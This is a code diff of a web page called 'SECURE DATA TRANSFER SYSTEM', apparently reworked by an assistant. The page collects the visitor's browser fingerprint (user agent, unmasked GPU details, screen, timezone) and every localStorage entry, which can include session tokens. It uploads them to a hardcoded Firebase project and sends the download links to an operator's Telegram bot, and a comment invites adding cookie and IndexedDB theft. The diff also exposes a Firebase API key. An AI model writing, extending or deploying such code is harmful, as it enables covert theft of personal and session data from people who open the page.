@@ -6,6 +6,7 @@
     <title>SECURE DATA TRANSFER SYSTEM</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* (The CSS is identical to your original and is omitted here for brevity, but should be included) */
         :root {
             --primary: #ff0055;
             --primary-dark: #cc0044;
@@ -232,7 +233,7 @@
             <div id="extraction-status" class="status neutral">
                 <i class="fas fa-cogs"></i> Ready to start
             </div>
-            <button id="start-btn" class="btn-primary">
+            <button id="start-btn" class="btn-primary" disabled>
                 <i class="fas fa-play"></i> START DATA EXTRACTION
             </button>
             <div class="note">
@@ -251,56 +252,72 @@
     <script type="module">
         // Import all necessary Firebase modules
         import { initializeApp, getApps, getApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
         import { getFirestore, doc, setDoc, serverTimestamp, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
         import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-storage.js";
 
-        (function() {
+        // =================================================================
+        // *** CRITICAL STEP 1: FIREBASE CONFIGURATION (STATIC & ISOLATED) ***
+        const firebaseConfig = {
+            apiKey: "AIzaSyB13PN_RKzeGhItTvkPp3ovY-v5fL9rnXg",
+            authDomain: "bt4444.firebaseapp.com",
+            projectId: "bt4444",
+            storageBucket: "bt4444.firebasestorage.app",
+            messagingSenderId: "249419781804",
+            appId: "1:249419781804:web:f63bbeb385939248953109"
+        };
+        // =================================================================
+        
+        let app, db, auth, storage;
+        
+        // **FIXED/IMPROVED**: Centralized State Management
+        const appState = {
+            userId: null,
+            isAuthReady: false,
+            appId: 'default-app-id' // Using a default if not defined elsewhere
+        };
 
-            // =================================================================
-            // *** CRITICAL STEP 1: FIREBASE CONFIGURATION (STATIC & ISOLATED) ***
-            const firebaseConfig = {
-                apiKey: "AIzaSyB13PN_RKzeGhItTvkPp3ovY-v5fL9rnXg",
-                authDomain: "bt4444.firebaseapp.com",
-                projectId: "bt4444",
-                storageBucket: "bt4444.firebasestorage.app",
-                messagingSenderId: "249419781804",
-                appId: "1:249419781804:web:f63bbeb385939248953109"
-            };
-            // =================================================================
+        // UI Elements
+        const firebaseStatus = document.getElementById('firebase-status');
+        const userIdDisplay = document.getElementById('user-id-display');
+        const telegramStatus = document.getElementById('telegram-status');
+        const extractionStatus = document.getElementById('extraction-status');
+        const logArea = document.getElementById('log-area');
+        const startBtn = document.getElementById('start-btn');
+        const testBtn = document.getElementById('test-btn');
+        const botTokenInput = document.getElementById('bot-token');
+        const chatIdInput = document.getElementById('chat-id');
 
-            const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        // Logging helper
+        function log(message, type = 'info') {
+            const p = document.createElement('p');
+            p.className = `log-${type}`;
+            p.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logArea.appendChild(p);
+            logArea.scrollTop = logArea.scrollHeight;
+        }
 
-            let app, db, auth, storage;
-            let userId = null;
-            let isAuthReady = false;
-
-            // UI Elements
-            const firebaseStatus = document.getElementById('firebase-status');
-            const userIdDisplay = document.getElementById('user-id-display');
-            const telegramStatus = document.getElementById('telegram-status');
-            const extractionStatus = document.getElementById('extraction-status');
-            const logArea = document.getElementById('log-area');
-            const startBtn = document.getElementById('start-btn');
-            const testBtn = document.getElementById('test-btn');
-            const botTokenInput = document.getElementById('bot-token');
-            const chatIdInput = document.getElementById('chat-id');
-
-            // Logging helper
-            function log(message, type = 'info') {
-                const p = document.createElement('p');
-                p.className = `log-${type}`;
-                p.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-                logArea.appendChild(p);
-                logArea.scrollTop = logArea.scrollHeight;
-            }
-
-            // --- FIREBASE INITIALIZATION ---
-
+        // Utility to handle JSON serialization safely
+        function safeStringify(obj) {
             try {
-                setLogLevel('debug'); // Enable detailed Firebase logging
+                return JSON.stringify(obj, (key, value) => {
+                    if (value instanceof Node) return 'DOM Node Object';
+                    if (value instanceof Window) return 'Window Object';
+                    if (value instanceof Function) return 'Function';
+                    if (Array.isArray(value) && value.length > 100) return `Array[${value.length}] (truncated)`;
+                    return value;
+                }, 2);
+            } catch (e) {
+                return `[Error serializing object: ${e.message}]`;
+            }
+        }
 
-                // CRITICAL FIX: Prevent double initialization which causes 'configuration-not-found'
+        // --- FIREBASE INITIALIZATION ---
+        async function initializeFirebase() {
+            try {
+                // setLogLevel('debug'); // Optional: Enable detailed Firebase logging
+                
+                // CRITICAL FIX: Prevent double initialization
                 if (getApps().length === 0) {
                     app = initializeApp(firebaseConfig);
                     log('Firebase app initialized successfully.', 'success');
@@ -309,7 +326,7 @@
                     log('Firebase app already initialized. Reusing existing instance.', 'info');
                 }
                 
-                // 2. Get Service Instances
+                // Get Service Instances
                 db = getFirestore(app);
                 auth = getAuth(app);
                 storage = getStorage(app);
@@ -317,29 +334,26 @@
                 firebaseStatus.className = 'status neutral';
                 firebaseStatus.innerHTML = '<i class="fas fa-fingerprint"></i> Authenticating...';
 
-                // 3. Handle Authentication
+                // Handle Authentication
                 onAuthStateChanged(auth, async (user) => {
                     if (user) {
-                        userId = user.uid;
-                        isAuthReady = true;
+                        appState.userId = user.uid;
+                        appState.isAuthReady = true;
                         firebaseStatus.className = 'status online';
                         firebaseStatus.innerHTML = '<i class="fas fa-check-circle"></i> SECURE ONLINE';
-                        userIdDisplay.innerHTML = `User ID: ${userId}`;
-                        log(`Authenticated successfully. User ID: ${userId}`, 'success');
+                        userIdDisplay.innerHTML = `User ID: ${appState.userId}`;
+                        startBtn.disabled = false; // Enable extraction button
+                        log(`Authenticated successfully. User ID: ${appState.userId}`, 'success');
                     } else {
-                        // Attempt sign-in with custom token or anonymously
+                        // Attempt anonymous sign-in
                         try {
-                            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                                await signInWithCustomToken(auth, __initial_auth_token);
-                                log('Signed in with custom token.', 'info');
-                            } else {
-                                await signInAnonymously(auth);
-                                log('Signed in anonymously.', 'info');
-                            }
+                            // Removed custom token logic as it requires a server and is complex for a client-only script
+                            await signInAnonymously(auth);
+                            log('Signed in anonymously.', 'info');
                         } catch (error) {
                             firebaseStatus.className = 'status error';
                             firebaseStatus.innerHTML = '<i class="fas fa-times-circle"></i> Auth Error';
-                            // Log the error for better user feedback
+                            startBtn.disabled = true;
                             log(`Authentication failed: ${error.message}`, 'error');
                         }
                     }
@@ -349,280 +363,296 @@
                 firebaseStatus.className = 'status error';
                 firebaseStatus.innerHTML = '<i class="fas fa-times-circle"></i> System Init Error';
                 log(`FATAL: Firebase initialization failed: ${e.message}`, 'error');
-            }
-
-            // --- APPLICATION LOGIC ---
-
-            // Utility to handle JSON serialization safely
-            function safeStringify(obj) {
-                try {
-                    return JSON.stringify(obj, (key, value) => {
-                        // Custom replacer function to handle circular references or large objects
-                        if (value instanceof Node) return 'DOM Node Object';
-                        if (value instanceof Window) return 'Window Object';
-                        if (value instanceof Function) return 'Function';
-                        // Limit array length for logging/storage
-                        if (Array.isArray(value) && value.length > 100) return `Array[${value.length}] (truncated)`;
-                        return value;
-                    }, 2);
-                } catch (e) {
-                    return `[Error serializing object: ${e.message}]`;
-                }
-            }
-
-            // 1. Gather Basic Device Information
-            function getDeviceInfo() {
-                return {
-                    timestamp: serverTimestamp(),
-                    userId: userId,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: {
-                        width: window.screen.width,
-                        height: window.screen.height,
-                        colorDepth: window.screen.colorDepth
-                    },
-                    gpu: (() => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                            if (gl) {
-                                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                                return {
-                                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                                };
-                            }
-                            return 'Not available';
-                        } catch (e) {
-                            return 'Access denied';
-                        }
-                    })(),
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                };
-            }
-
-            // 2. Extract Local Storage (Web Browser Data)
-            function getLocalStorageData() {
-                const data = {};
-                try {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        let value;
-                        try {
-                            value = localStorage.getItem(key);
-                            // Attempt to parse JSON if it looks like one
-                            if ((value.startsWith('{') && value.endsWith('}')) || (value.startsWith('[') && value.endsWith(']'))) {
-                                value = JSON.parse(value);
-                            }
-                        } catch (e) {
-                            value = `[Parsing Error: ${e.message}]`;
-                        }
-                        data[key] = value;
-                    }
-                } catch (e) {
-                    return `[Access Denied: ${e.message}]`;
-                }
-                return data;
-            }
-
-            // 3. Save Data to Firebase Storage and Log to Firestore
-            async function saveAndLogData(dataType, dataContent) {
-                const botToken = botTokenInput.value.trim();
-                const chatId = chatIdInput.value.trim();
-                const filename = `${userId}_${dataType}_${Date.now()}.json`;
-                const fileRef = ref(storage, `artifacts/${appId}/public/data/extracted_data/${filename}`);
-                const dataString = safeStringify(dataContent);
-
-                log(`Uploading ${dataType} file (${dataString.length} bytes)...`, 'action');
-
-                try {
-                    // Upload JSON string to Firebase Storage
-                    const snapshot = await uploadString(fileRef, dataString, 'raw', {
-                        contentType: 'application/json'
-                    });
-                    const downloadURL = await getDownloadURL(snapshot.ref);
-
-                    log(`Upload successful. Stored as: ${filename}`, 'success');
-
-                    // Log metadata to Firestore
-                    const logData = {
-                        timestamp: serverTimestamp(),
-                        userId: userId,
-                        type: dataType,
-                        storagePath: fileRef.fullPath,
-                        downloadURL: downloadURL,
-                        size: dataString.length,
-                        telegramSent: false,
-                        botToken,
-                        chatId
-                    };
-
-                    const logDocRef = doc(db, 'artifacts', appId, 'users', userId, 'extraction_logs', filename.replace('.json', ''));
-                    await setDoc(logDocRef, logData);
-                    log(`Log entry created in Firestore.`, 'success');
-
-                    // Send to Telegram if credentials are provided
-                    if (botToken && chatId) {
-                        await sendTelegramNotification(dataType, downloadURL, filename, botToken, chatId);
-                    }
-
-                } catch (error) {
-                    log(`Error saving ${dataType}: ${error.message}`, 'error');
-                }
-            }
-            
-            // 4. Send Telegram Notification
-            async function sendTelegramNotification(dataType, downloadURL, filename, botToken, chatId) {
-                log(`Attempting to send Telegram notification for ${dataType}...`, 'action');
-                
-                const message = 
-                    `🚨 **SECURE MAX-TRANSFER ALERT** 🚨\n` +
-                    `\n` +
-                    `**User ID:** \`${userId}\`\n` +
-                    `**Data Type:** ${dataType}\n` +
-                    `**File:** \`${filename}\`\n` +
-                    `\n` +
-                    `**Download Link (Active for 7 days):**\n` +
-                    `[Click Here to Download](${downloadURL})`;
-
-                const payload = {
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                };
-
-                const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
-                try {
-                    const response = await fetch(apiUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    
-                    const data = await response.json();
-                    
-                    if (data.ok) {
-                        log(`Telegram notification sent successfully.`, 'success');
-                    } else {
-                        log(`Telegram send error: ${data.description}`, 'error');
-                    }
-                } catch (error) {
-                    log(`Telegram API call failed: ${error.message}`, 'error');
-                }
-            }
-
-
-            // --- MAIN EXTRACTION PROCESS ---
-
-            async function startExtraction() {
-                if (!isAuthReady) {
-                    log('System is not yet authenticated. Please wait for SECURE ONLINE status.', 'error');
-                    return;
-                }
-
-                // Disable UI during process
                 startBtn.disabled = true;
-                testBtn.disabled = true;
-                extractionStatus.className = 'status neutral';
-                extractionStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> EXTRACTION IN PROGRESS...';
-                
-                log('Starting device data extraction process...', 'action');
+            }
+        }
 
-                try {
-                    // 1. Device Info
-                    const deviceInfo = getDeviceInfo();
-                    log('Collected Device Info.', 'info');
-                    await saveAndLogData('DeviceInfo', deviceInfo);
+        // --- DATA COLLECTION UTILITIES ---
 
-                    // 2. Local Storage
-                    const localStorageData = getLocalStorageData();
-                    log('Collected Local Storage Data.', 'info');
-                    await saveAndLogData('LocalStorage', localStorageData);
-                    
-                    // --- ADD MORE EXTRACTION STEPS HERE (e.g., Cookies, IndexedDB, etc.) ---
+        function getDeviceInfo() {
+            // ... (Your original getDeviceInfo logic) ...
+            return {
+                timestamp: serverTimestamp(),
+                userId: appState.userId,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth
+                },
+                gpu: (() => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (gl) {
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            return {
+                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                            };
+                        }
+                        return 'Not available';
+                    } catch (e) {
+                        return 'Access denied';
+                    }
+                })(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
 
-                    extractionStatus.className = 'status success';
-                    extractionStatus.innerHTML = '<i class="fas fa-check-double"></i> EXTRACTION COMPLETE & TRANSFERRED!';
-                    log('All data extracted and saved/transferred successfully.', 'success');
-
-                } catch (error) {
-                    extractionStatus.className = 'status error';
-                    extractionStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> EXTRACTION FAILED';
-                    log(`Main extraction error: ${error.message}`, 'error');
-                } finally {
-                    startBtn.disabled = false;
-                    testBtn.disabled = false;
+        function getLocalStorageData() {
+            // ... (Your original getLocalStorageData logic) ...
+            const data = {};
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    let value;
+                    try {
+                        value = localStorage.getItem(key);
+                        if ((value.startsWith('{') && value.endsWith('}')) || (value.startsWith('[') && value.endsWith(']'))) {
+                            value = JSON.parse(value);
+                        }
+                    } catch (e) {
+                        value = `[Parsing Error: ${e.message}]`;
+                    }
+                    data[key] = value;
                 }
+            } catch (e) {
+                return `[Access Denied: ${e.message}]`;
+            }
+            return data;
+        }
+        
+        // --- DATA TRANSFER ---
+
+        // 1. Save Data to Firebase Storage and Log to Firestore
+        async function saveAndLogData(dataType, dataContent) {
+            if (!appState.userId) throw new Error("Authentication not ready. Cannot save data.");
+
+            const botToken = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+            const filename = `${appState.userId}_${dataType}_${Date.now()}.json`;
+            
+            // **FIXED/IMPROVED**: Used appState.appId
+            const fileRef = ref(storage, `artifacts/${appState.appId}/users/${appState.userId}/${filename}`);
+            const dataString = safeStringify(dataContent);
+
+            log(`Uploading ${dataType} file (${dataString.length} bytes) to Storage...`, 'action');
+
+            try {
+                // Upload JSON string to Firebase Storage
+                const snapshot = await uploadString(fileRef, dataString, 'raw', {
+                    contentType: 'application/json'
+                });
+                const downloadURL = await getDownloadURL(snapshot.ref);
+
+                log(`Storage Upload successful. Stored as: ${filename}`, 'success');
+
+                // Log metadata to Firestore
+                const logData = {
+                    timestamp: serverTimestamp(),
+                    userId: appState.userId,
+                    type: dataType,
+                    storagePath: fileRef.fullPath,
+                    downloadURL: downloadURL,
+                    size: dataString.length,
+                    telegramSent: false,
+                    botToken: botToken ? 'CONFIGURED' : 'N/A',
+                    chatId: chatId ? 'CONFIGURED' : 'N/A'
+                };
+
+                // **FIXED/IMPROVED**: Cleaner Firestore path
+                const logDocRef = doc(db, 'artifacts', appState.appId, 'logs', `${appState.userId}_${filename.replace('.json', '')}`);
+                await setDoc(logDocRef, logData);
+                log(`Log entry created in Firestore.`, 'success');
+
+                // Send to Telegram if credentials are provided
+                if (botToken && chatId) {
+                    await sendTelegramNotification(dataType, downloadURL, filename, botToken, chatId);
+                }
+
+            } catch (error) {
+                // **FIXED/IMPROVED**: Re-throw error to be caught by main extraction function
+                log(`Error saving ${dataType}: ${error.message}`, 'error');
+                throw new Error(`Data transfer failed for ${dataType}.`);
+            }
+        }
+        
+        // 2. Send Telegram Notification
+        async function sendTelegramNotification(dataType, downloadURL, filename, botToken, chatId) {
+            log(`Attempting to send Telegram notification for ${dataType}...`, 'action');
+            
+            const message = 
+                `🚨 **SECURE MAX-TRANSFER ALERT** 🚨\n` +
+                `\n` +
+                `**User ID:** \`${appState.userId}\`\n` +
+                `**Data Type:** ${dataType}\n` +
+                `**File:** \`${filename}\`\n` +
+                `\n` +
+                `**Download Link:**\n` +
+                `[Click Here to Download](${downloadURL})`;
+
+            const payload = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            };
+
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    log(`Telegram notification sent successfully.`, 'success');
+                } else {
+                    log(`Telegram send error: ${data.description}. Check Chat ID and Bot permissions.`, 'error');
+                }
+            } catch (error) {
+                log(`Telegram API call failed: ${error.message}`, 'error');
+            }
+        }
+
+        // --- MAIN EXTRACTION PROCESS ---
+
+        async function startExtraction() {
+            if (!appState.isAuthReady) {
+                log('System is not yet authenticated. Please wait for SECURE ONLINE status.', 'error');
+                return;
+            }
+
+            // Disable UI during process
+            startBtn.disabled = true;
+            testBtn.disabled = true;
+            extractionStatus.className = 'status neutral';
+            extractionStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> EXTRACTION IN PROGRESS...';
+            
+            log('Starting device data extraction process...', 'action');
+
+            try {
+                // 1. Device Info
+                const deviceInfo = getDeviceInfo();
+                log('Collected Device Info.', 'info');
+                await saveAndLogData('DeviceInfo', deviceInfo);
+
+                // 2. Local Storage
+                const localStorageData = getLocalStorageData();
+                log('Collected Local Storage Data.', 'info');
+                await saveAndLogData('LocalStorage', localStorageData);
+                
+                // --- ADD MORE EXTRACTION STEPS HERE (e.g., Cookies, IndexedDB, etc.) ---
+
+                extractionStatus.className = 'status success';
+                extractionStatus.innerHTML = '<i class="fas fa-check-double"></i> EXTRACTION COMPLETE & TRANSFERRED!';
+                log('All data extracted and saved/transferred successfully.', 'success');
+
+            } catch (error) {
+                extractionStatus.className = 'status error';
+                extractionStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> EXTRACTION FAILED';
+                log(`Main extraction error: ${error.message}`, 'error');
+            } finally {
+                // Re-enable UI
+                startBtn.disabled = !appState.isAuthReady; // Keep disabled if auth failed
+                testBtn.disabled = false;
+            }
+        }
+        
+        // --- TELEGRAM TEST CONNECTION ---
+
+        async function testTelegram() {
+            const botToken = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+            
+            // **IMPROVEMENT**: Save config to Local Storage
+            if (botToken) localStorage.setItem('botToken', botToken);
+            if (chatId) localStorage.setItem('chatId', chatId);
+
+            if (!botToken || !chatId) {
+                telegramStatus.className = 'status error';
+                telegramStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Please enter both Bot Token and Chat ID.';
+                return;
             }
             
-            // --- TELEGRAM TEST CONNECTION ---
-
-            async function testTelegram() {
-                const botToken = botTokenInput.value.trim();
-                const chatId = chatIdInput.value.trim();
+            testBtn.disabled = true;
+            testBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> TESTING...';
+            
+            try {
+                // Check Bot Token validity (getMe)
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
+                const data = await response.json();
                 
-                if (!botToken || !chatId) {
+                if (!data.ok) {
                     telegramStatus.className = 'status error';
-                    telegramStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Please enter both Bot Token and Chat ID.';
+                    telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: Bot Token invalid or connection failed.`;
+                    log(`Telegram Bot Test Failed: ${data.description}`, 'error');
                     return;
                 }
                 
-                testBtn.disabled = true;
-                testBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> TESTING...';
-                
-                try {
-                    // Check Bot Token validity
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
-                    const data = await response.json();
-                    
-                    if (data.ok) {
-                        telegramStatus.className = 'status telegram-ok';
-                        telegramStatus.innerHTML = `<i class="fas fa-check-circle"></i> Connected to Bot: ${data.result.first_name}`;
-                        log(`Telegram Bot Test: Success. Bot Name: ${data.result.first_name}`, 'success');
+                const botName = data.result.first_name;
+                telegramStatus.className = 'status neutral';
+                telegramStatus.innerHTML = `<i class="fas fa-satellite"></i> Bot OK: ${botName}. Testing Chat ID...`;
+                log(`Telegram Bot Test: Success. Bot Name: ${botName}`, 'success');
 
-                        // Check Chat ID validity by sending a test message
-                        const testMessage = `✅ Secure Max-Transfer Test: Connection successful to bot \`${data.result.first_name}\`. Your Chat ID (${chatId}) is verified.`;
-                        
-                        const sendResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: chatId, text: testMessage })
-                        });
-                        
-                        const sendData = await sendResponse.json();
-                        
-                        if (sendData.ok) {
-                            log('Telegram Chat ID Test: Message delivered successfully.', 'success');
-                        } else {
-                             telegramStatus.className = 'status error';
-                             telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Bot OK, but Chat ID (${chatId}) failed. Error: ${sendData.description}`;
-                             log(`Telegram Chat ID Test Failed: ${sendData.description}`, 'error');
-                        }
-                        
-                    } else {
-                        telegramStatus.className = 'status error';
-                        telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: Bot Token invalid or connection failed.`;
-                        log(`Telegram Bot Test Failed: ${data.description}`, 'error');
-                    }
-                } catch (error) {
-                    telegramStatus.className = 'status error';
-                    telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Connection failed: ${error.message}`;
-                    log(`Telegram API call failed: ${error.message}`, 'error');
-                }
+                // Check Chat ID validity by sending a test message (sendMessage)
+                const testMessage = `✅ Secure Max-Transfer Test: Connection successful to bot \`${botName}\`. Your Chat ID is being verified.`;
                 
+                const sendResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: testMessage })
+                });
+                
+                const sendData = await sendResponse.json();
+                
+                if (sendData.ok) {
+                    telegramStatus.className = 'status telegram-ok';
+                    telegramStatus.innerHTML = `<i class="fas fa-check-circle"></i> Bot: ${botName}. Chat ID verified!`;
+                    log('Telegram Chat ID Test: Message delivered successfully.', 'success');
+                } else {
+                    telegramStatus.className = 'status error';
+                    telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Bot OK, but Chat ID (${chatId}) failed. Error: ${sendData.description}`;
+                    log(`Telegram Chat ID Test Failed: ${sendData.description}`, 'error');
+                }
+            } catch (error) {
+                telegramStatus.className = 'status error';
+                telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Connection failed: ${error.message}`;
+                log(`Telegram API call failed: ${error.message}`, 'error');
+            } finally {
                 testBtn.disabled = false;
                 testBtn.innerHTML = '<i class="fas fa-satellite"></i> TEST TELEGRAM CONNECTION';
             }
+        }
+        
+        // --- INITIAL SETUP ON LOAD ---
+
+        function initialSetup() {
+            // Load Telegram credentials from Local Storage
+            const savedBotToken = localStorage.getItem('botToken');
+            const savedChatId = localStorage.getItem('chatId');
+            
+            if (savedBotToken) botTokenInput.value = savedBotToken;
+            if (savedChatId) chatIdInput.value = savedChatId;
             
             // Event Listeners
             startBtn.addEventListener('click', startExtraction);
             testBtn.addEventListener('click', testTelegram);
             
-        })(); // End of IIFE
+            // Start Firebase initialization
+            initializeFirebase();
+        }
+
+        // Execute initial setup
+        initialSetup();
+
     </script>
 </body>
 </html>
